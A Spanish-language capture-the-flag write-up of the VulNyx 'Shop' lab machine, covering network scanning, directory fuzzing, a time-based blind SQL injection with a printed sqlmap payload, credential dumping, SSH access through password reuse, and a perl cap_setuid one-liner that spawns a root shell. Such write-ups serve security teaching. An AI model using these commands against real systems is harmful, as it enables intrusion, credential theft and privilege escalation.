# VulNyx | Shop | Writeup
>Laboratorio de pentesting en un entorno controlado. Este documento describe únicamente las pruebas realizadas sobre la máquina Shop de VulNyx.

## Información del laboratorio
<img width="433" height="313" alt="image" src="https://github.com/user-attachments/assets/878c215a-e111-44cf-ba20-96f27e1d3089" />

| Campo | Valor |
|-------|-------|
| Nombre | Shop (VulNyx Shop) |
| IP objetivo | `192.168.0.9` |
| IP atacante | `192.168.0.13` |
| Gateway | `192.168.0.1` |
| Sistema operativo | Debian 10 (buster) |
| Puertos abiertos | `22/tcp` (SSH) · `80/tcp` (HTTP) |
| Servidor web | Apache/2.4.38 (Debian) |
| Base de datos | MariaDB (MySQL ≥ 5.0.12) |
| Flag de usuario | `598a05f84190e3xxxxxxxxxxxxx` |
| Flag de root | `1c4cddb6c20e0e75xxxxxxxxxxxx` |

---

## 🗂️ Índice

1. [Reconocimiento de red (host discovery)](#1-reconocimiento-de-red-host-discovery)
2. [Enumeración de puertos y servicios](#2-enumeración-de-puertos-y-servicios)
3. [Enumeración web (HTTP)](#3-enumeración-web-http)
4. [Explotación: SQL Injection en el panel de login](#4-explotación-sql-injection-en-el-panel-de-login)
5. [Extracción de credenciales de la base de datos](#5-extracción-de-credenciales-de-la-base-de-datos)
6. [Foothold: acceso por SSH (password reuse)](#6-foothold-acceso-por-ssh-password-reuse)
7. [Escalada de privilegios: Linux Capabilities](#7-escalada-de-privilegios-linux-capabilities)
8. [Cadena de ataque (resumen)](#8-cadena-de-ataque-resumen)

---

## 1. Reconocimiento de red (host discovery)

Antes de interactuar con el objetivo identifico la red para entender dónde estamos y qué hay vivo en el segmento.

### Identificación del segmento de red

```bash
ip -br addr
```

<img width="963" height="72" alt="Identificación de segmento de red" src="https://github.com/user-attachments/assets/911e0c18-a575-47bd-bcad-46069c43b1bb" />

**Por qué:** `ip -br addr` muestra las interfaces en formato abreviado. Se confirma que nuestra interfaz `eth0` tiene la IP `192.168.0.13/24`. El `/24` indica que el segmento es `192.168.0.0/24` (256 direcciones posibles), que será el rango a barrer.

### Identificación de la puerta de enlace

```bash
ip route
```

<img width="963" height="72" alt="Identificación de segmento de red" src="https://github.com/user-attachments/assets/d7e7b79d-52da-4b39-9be2-cd8215dabd72" />

**Por qué:** conocer  la puerta de enlace (`192.168.0.1`) permite entender la topología y descartarla como objetivo. La ruta por defecto confirma que todo el tráfico de salida pasa por este router.

### Descubrimiento de hosts por ARP

```bash
sudo nmap -sn -PR 192.168.0.0/24 -oA host-discovery-inicial
```

<img width="536" height="484" alt="image" src="https://github.com/user-attachments/assets/4d88481d-35cc-4661-aa04-542cf836d125" />

**Por qué ARP (`-PR`):** En una red local (mismo dominio de broadcast), el descubrimiento por **ARP** es el más fiable y veloz. A diferencia del ping ICMP —que suele estar filtrado por firewalls— **ningún host puede ignorar ARP** si quiere comunicarse en la LAN. La opción `-sn` desactiva el escaneo de puertos (solo queremos saber qué está activo).

De los 9 hosts detectados, el objetivo es **`192.168.0.9`**.

### Listado limpio de hosts vivos

```bash
awk '/Status: Up/ {print $2}' host-discovery-inicial.gnmap
```

<img width="536" height="484" alt="image" src="https://github.com/user-attachments/assets/c96f58b6-311b-465b-91eb-999e198366ff" />

---

## 2. Enumeración de puertos y servicios

### Escaneo completo de puertos TCP

```bash
sudo nmap -sS -p- 192.168.0.9 -oA port-scanning-full-tcp-192.168.0.9
```

<img width="536" height="484" alt="image" src="https://github.com/user-attachments/assets/17940772-3b55-4302-957f-7ba3bfe38d50" />

**Por qué `-p-` y `-sS`:**
- `-p-` escanea **los 65535 puertos**. Nunca asumimos que los servicios están en los puertos "típicos": un escaneo parcial puede dejar pasar vectores escondidos en puertos altos.
- `-sS` (SYN scan / *half-open*) es rápido y algo más sigiloso: no completa el *handshake* TCP completo.

**Resultado:** solo dos puertos abiertos.

| Puerto | Servicio |
|--------|----------|
| `22/tcp` | SSH |
| `80/tcp` | HTTP |

Esto define la estrategia: **el 80 es la superficie de ataque**, y el **22 (SSH)** será probablemente la vía de acceso una vez que obtengamos credenciales.

### Detección de sistema operativo

```bash
sudo nmap -O 192.168.0.9 -oA os-fingerprint-192.168.0.9
```

<img width="960" height="296" alt="Descubrimiento de Sistema Operativo" src="https://github.com/user-attachments/assets/576d00e7-00a6-44f7-8a5e-68d44755cb6a" />

**Por qué:** el *fingerprinting* de SO (`-O`) analiza las respuestas de la pila TCP/IP para estimar el sistema. Reporta un kernel Linux, consistente con el Debian que luego confirmaremos por las cabeceras HTTP. Es contexto útil para elegir exploits de escalada adecuados.

---

## 3. Enumeración web (HTTP)

### Inspección de cabeceras HTTP

```bash
curl -I http://192.168.0.9 | tee http-headers-inicial-192.168.0.9.txt
```

<img width="645" height="218" alt="Inspección de cabecera http puerto 80" src="https://github.com/user-attachments/assets/9d12b7dd-d8a9-419b-acdd-140a358a5dda" />

**Por qué:** `curl -I` pide **solo las cabeceras** (método HEAD). Nos revela el stack del servidor: **Apache/2.4.38 (Debian)**. Identificar la versión exacta permite buscar vulnerabilidades conocidas asociadas y entender el entorno (Debian 10 "buster").

### Búsqueda de `robots.txt`

```bash
curl -i http://192.168.0.9/robots.txt | tee http-robots-inicial-192.168.0.9.txt
```

<img width="679" height="309" alt="Inspección via curl de archivo robotstxt" src="https://github.com/user-attachments/assets/84d36d7c-35a5-4e5f-a276-1a1bae5f24fb" />

**Por qué:** `robots.txt` suele listar rutas que el administrador no quiere indexar… lo que a veces delata directorios interesantes. En este caso devuelve **404 Not Found**, así que se descarta esa vía.

### Fuzzing de directorios con Gobuster

```bash
gobuster dir -u http://192.168.0.9 \
  -w /usr/share/wordlists/dirb/common.txt \
  -t 10 -o gobuster-common-192.168.0.9.txt
```

<img width="961" height="466" alt="HTTP Directory Enumeration with Gobuster" src="https://github.com/user-attachments/assets/2ae27ff1-0a20-4796-8ee8-1a026f31f68b" />

**Por qué:** gran parte del contenido web no está enlazado desde la página principal. El *fuzzing* de directorios prueba miles de rutas comunes contra el servidor para descubrir contenido oculto. Hallazgos:

| Ruta | Código | Interpretación |
|------|--------|----------------|
| `/administrator/` | 301 | **Panel de login** → nuestro objetivo principal |
| `/css/`, `/fonts/`, `/js/` | 301 → 403 | Directorios existentes pero sin *listing* |
| `index.html` | 200 | Página pública |
| `.htpasswd`, `.htaccess`, `server-status` | 403 | Protegidos |

### Visualización de las rutas en el navegador

El panel de administración:

<img width="578" height="233" alt="Visualización de pagina js en navegador" src="https://github.com/user-attachments/assets/b0dbdf1c-d3ab-4ce8-911c-561cf2ee6bea" />

Los directorios `/css/`, `/fonts/` y `/js/` responden **403 Forbidden** (el *directory listing* está deshabilitado, no podemos listar su contenido):

<img width="578" height="233" alt="Visualización de pagina js en navegador" src="https://github.com/user-attachments/assets/1b614486-6275-4928-8a51-6c313bbabaec" />
<img width="578" height="233" alt="Visualización de pagina js en navegador" src="https://github.com/user-attachments/assets/9ea7bea5-0f76-4f98-b3f4-deb94d0a7198" />
<img width="578" height="233" alt="Visualización de pagina js en navegador" src="https://github.com/user-attachments/assets/63ebc693-3a33-4454-856d-9588f017d70f" />

**Conclusión de la fase:** el único punto de interacción real es el **formulario de login** en `/administrator/`. Hacia ahí enfocamos el ataque.

---

## 4. Explotación: SQL Injection en el panel de login

### Captura de la petición con Burp Suite

Interceptamos un intento de login (`username=test`, `password=test`) para conocer la petición exacta:

<img width="639" height="741" alt="INTERCEPTO QUERY con burpsuite panel administrator" src="https://github.com/user-attachments/assets/d1849b19-1852-4801-98f8-5dd3df858112" />

**Por qué:** necesitamos la **petición HTTP cruda** (método, endpoint, cabeceras, cookie de sesión y parámetros) para alimentar a `sqlmap`. Observamos:

- Endpoint real: `POST /administrator/login.php`
- Parámetros: `username`, `password`, `submit`
- Cookie de sesión `PHPSESSID`

Guardamos esa petición cruda en un archivo `req.txt` (desde Burp → *Copy to file*, o manualmente respetando la línea en blanco entre cabeceras y cuerpo).

### Detección automática de la inyección con sqlmap

```bash
sqlmap -r req.txt -p username --batch
```

<img width="964" height="780" alt="Descubrimiento de vulnerabilidades con sqlmap" src="https://github.com/user-attachments/assets/d9aacd38-7bd2-4f68-8c4d-b3c3a8289c1c" />

**Desglose del comando:**
- `-r req.txt` → sqlmap lee la petición desde el archivo (hereda URL, cookie y parámetros).
- `-p username` → inyecta **únicamente** en el parámetro `username`, el candidato más probable (es el campo que se consulta primero contra la tabla de usuarios).
- `--batch` → responde automáticamente a todas las preguntas interactivas con la opción por defecto.

**Resultado:** el parámetro `username` es vulnerable a **SQL Injection time-based blind**:

```
Parameter: username (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=test' AND (SELECT 7989 FROM (SELECT(!SLEEP(5)))KtXh) AND 'rWKi'='rWKi&password=test&submit=
```

**¿Qué significa "time-based blind"?** La aplicación no devuelve el resultado de la consulta ni mensajes de error (inyección *a ciegas*). La técnica consiste en inyectar una condición que, si es verdadera, obliga a la base a **dormir N segundos** (`SLEEP(5)`). Midiendo el tiempo de respuesta, se infiere bit a bit la información. Es más lento, pero igual de efectivo.

Dos detalles relevantes que reporta sqlmap:
- **Redirección 302 a `profile.php`** → la inyección también permite **bypassear la autenticación** (una condición verdadera "loguea").
- **UNION injectable con 2 columnas** → vector alternativo más rápido para extraer datos.

Backend confirmado: **MySQL ≥ 5.0.12 (fork MariaDB)** sobre Debian 10 / Apache 2.4.38.

---

## 5. Extracción de credenciales de la base de datos

El flujo de extracción es **acumulativo**: cada paso usa el nombre descubierto en el anterior (bases → tablas → columnas → datos).

### Paso 1 — Listar las bases de datos

```bash
sqlmap -r req.txt -p username --batch --dbs
```

<img width="970" height="689" alt="Listado de tablas con sqlmap Users" src="https://github.com/user-attachments/assets/593165cd-be58-479a-80e3-578903598f69" />

<img width="970" height="689" alt="Listado de tablas con sqlmap Users" src="https://github.com/user-attachments/assets/594c3a67-588e-4f59-8f71-0c8a50eb3bce" />

<img width="975" height="712" alt="Ya encontrada la vunerabilidad copn sqlmap solicito listar todas las bases de datos" src="https://github.com/user-attachments/assets/a5bc8771-21bf-408c-ab67-da8690df805" />

<img width="226" height="86" alt="Listado fina lde bases de datos listadas con sqlmap" src="https://github.com/user-attachments/assets/5b7355d5-60e1-4e57-b76a-c3efd51bd3e4" />


**Por qué:** `--dbs` enumera todas las bases disponibles. De las cuatro, tres son del sistema (`information_schema`, `mysql`, `performance_schema`) y **`Webapp`** es la de la aplicación → nuestra base de interés.

### Paso 2 — Listar las tablas de `Webapp`

```bash
sqlmap -r req.txt -p username --batch -D Webapp --tables
```

<img width="970" height="689" alt="Listado de tablas con sqlmap Users" src="https://github.com/user-attachments/assets/afd53ed5-2a0b-4984-9a49-9ee87fa36a7f" />

**Por qué:** `-D Webapp --tables` enumera las tablas de esa base. Resultado: una sola tabla, **`Users`** (ojo con las mayúsculas). Ahí deberían estar las credenciales.

### Paso 3 — Volcar la tabla `Users`

```bash
sqlmap -r req.txt -p username --batch -D Webapp -T Users --dump
```

<img width="862" height="766" alt="image" src="https://github.com/user-attachments/assets/2be8f34c-7bcc-4dba-a856-2cddf7e9ff9a" />
<img width="249" height="146" alt="image" src="https://github.com/user-attachments/assets/3f248d0b-b1c7-4f7f-a332-2494fd700c91" />

**Por qué:** `--dump` extrae todo el contenido de la tabla. **Hallazgo crítico:** las contraseñas están almacenadas **en texto plano** (sin hashear), por lo que no hace falta crackear nada:

| id | username | password |
|----|----------|----------|
| 1 | peter | `peterxxxx` |
| 2 | mike | `mikebxxxx` |
| 3 | bart | `b4rxxxx` |
| 4 | liam | `liam@ndxxxxx` |

### Las credenciales NO servían para la web

Probamos los cuatro usuarios en el panel `/administrator/`. Todos autentican, pero caen en `profile.php` con un cartel **"Under Construction"**: no hay funcionalidad explotable por la web.

<img width="249" height="146" alt="image" src="https://github.com/user-attachments/assets/dc6fa728-1912-4d42-bde0-bfb105e9cba6" />
<img width="249" height="146" alt="image" src="https://github.com/user-attachments/assets/c1bc9f4e-a0b1-43bd-9205-32342f75a868" />
<img width="587" height="297" alt="Login con usuario bart" src="https://github.com/user-attachments/assets/b0117141-8a3c-478e-958e-55071eaffb57" />
<img width="587" height="297" alt="Login con usuario bart" src="https://github.com/user-attachments/assets/a1d505b5-37db-44a9-bac7-2a80260097c5" />

**Por qué es importante entender esto:** el panel web era un *señuelo*. El verdadero valor de esas credenciales está en el **principio de reutilización de contraseñas** (*password reuse*): probarlas en **otros servicios** del mismo host, concretamente **SSH**.

---

## 6. Foothold: acceso por SSH (password reuse)

```bash
ssh bart@192.168.0.9
# password: b4rtp0w4
```

<img width="402" height="124" alt="image" src="https://github.com/user-attachments/assets/8528c910-9857-4e49-9add-3fd9f944bf92" />

**Por qué `bart`:** probamos las credenciales extraídas contra el servicio SSH descubierto en la fase 2. El par **`bart:b4rtp0w4`** otorga acceso. Esta es la lección central del lab: **las credenciales de una aplicación suelen reutilizarse para el acceso al sistema**.

Ya dentro, enumeramos nuestro contexto:

```bash
whoami        # bart
id            # uid=1000(bart) gid=1000(bart) grupos=1000(bart)
ls
cat user.txt  # 598a05f84190exxxxxxxxxx
```

🏁 **Flag de usuario:** `598a05f84190exxxxxxxxxx`

---

## 7. Escalada de privilegios: Linux Capabilities

### Descartar sudo

```bash
sudo -l
```

<img width="417" height="74" alt="Sin permisos sudo para escalar a root" src="https://github.com/user-attachments/assets/e0d28081-f911-4553-99e3-1d897e1c1296" />


**Por qué:** el primer chequeo de escalada siempre es `sudo -l` (ver qué podemos ejecutar como otro usuario). Aquí devuelve `sudo: orden no encontrada` — el binario `sudo` ni siquiera está instalado. Vía descartada; hay que buscar otro vector.

### Búsqueda de capabilities

```bash
/usr/sbin/getcap -r / 2>/dev/null
```

<img width="348" height="39" alt="Busqueda de capabilities para escalar a root" src="https://github.com/user-attachments/assets/84959b67-882f-4381-bb54-b83d2a945ca1" />

**Por qué:** las **Linux Capabilities** fragmentan los privilegios de root en permisos granulares que pueden asignarse a binarios concretos. `getcap -r /` busca recursivamente binarios con capabilities asignadas (redirigimos *stderr* a `/dev/null` para silenciar los errores de permisos).

**Hallazgo:**

```
/usr/bin/perl5.28.1 = cap_setuid+ep
/usr/bin/perl       = cap_setuid+ep
```

El binario **`perl`** tiene la capability **`cap_setuid`**. Esto le permite **cambiar su UID efectivo a 0 (root)** sin ser un binario SUID clásico. Es un vector de escalada directo documentado en **GTFOBins**.

### Explotación con GTFOBins

```bash
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'
```

<img width="581" height="120" alt="image" src="https://github.com/user-attachments/assets/c083f694-24d4-4750-9b57-2a5541b1631d" />

**Por qué funciona:** como `perl` posee `cap_setuid`, la llamada `POSIX::setuid(0)` tiene éxito y fija el UID a 0. A continuación `exec "/bin/bash"` reemplaza el proceso por una shell **que ya corre como root**.

```bash
whoami        # root
cd /root
cat root.txt  # 1c4cddb6c20exxxxxxxxxxxxxxxxxx
```

🏁 **Flag de root:** `1c4cddb6c20xxxxxxxxxxxxxxxx`

---

## 8. Cadena de ataque (resumen)

```
┌─────────────────────────────────────────────────────────────────────┐
│ 1. Recon de red (ARP host discovery)      → objetivo 192.168.0.9     │
│ 2. Nmap -sS -p-                           → 22/SSH, 80/HTTP          │
│ 3. Gobuster                               → /administrator/ (login)  │
│ 4. Burp + sqlmap                          → SQLi time-based blind    │
│ 5. sqlmap --dump (Webapp.Users)           → 4 creds EN TEXTO PLANO   │
│ 6. Password reuse → ssh bart:b4rtp0w4     → FOOTHOLD + user.txt      │
│ 7. getcap → perl cap_setuid (GTFOBins)    → ROOT + root.txt          │
└─────────────────────────────────────────────────────────────────────┘
```

**Las dos vulnerabilidades que encadenan el compromiso total son:**
1. **SQL Injection** no parametrizada en el login → exposición de la base de datos.
2. **Contraseñas en texto plano + reutilización** → acceso al sistema por SSH.
3. **Capability `cap_setuid` sobre `perl`** → escalada a root.

---

*Writeup realizado en un entorno de laboratorio autorizado (VulNyx). Uso exclusivamente educativo.*
